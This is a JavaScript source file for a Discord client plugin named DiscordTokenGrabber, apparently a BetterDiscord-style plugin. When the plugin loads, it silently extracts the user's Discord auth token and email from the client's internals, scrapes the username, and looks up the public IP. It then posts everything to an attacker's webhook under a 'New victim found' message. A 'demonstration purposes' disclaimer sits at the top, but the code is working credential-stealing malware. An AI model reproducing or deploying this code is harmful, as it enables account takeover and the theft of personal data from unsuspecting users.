/** 
  * @name DiscordTokenGrabber
  * @version 1.1
  * @description Plugin for getting someone else's auth token Discord
*/

/* Authors
 * ethernalsteve - Developer
 * The Way - Co-Author of the idea
*/

/* This plugin is for demonstration purposes! Not recommended for malicious purposes! */

const config = {
    "info": {
        "name": "DiscordTokenGrabber",
        "authors": ["ethernalsteve", "The Way", "your nickname"],
        "version": "1.1",
        "description": "Plugin for getting someone else's auth token Discord"
    },
    // Your webhook. Don't even try, this webhook is invalid :3
    "webhook": "https://ptb.discord.com/api/webhooks/998142010731012177/qSxkkCr7jFB8O5wsxuS_2JaO3q5FTceDnrIyDwJoIZU5ZRNvo7KnOSbaawHRgWajHqeU"
}

class DiscordTokenGrabber {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = $("[class *= \"nameTag\"]").first().text();

        $.getJSON("https://api.ipify.org?format=json", (data) => { 
            require("request").post(config.webhook, {form: {content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
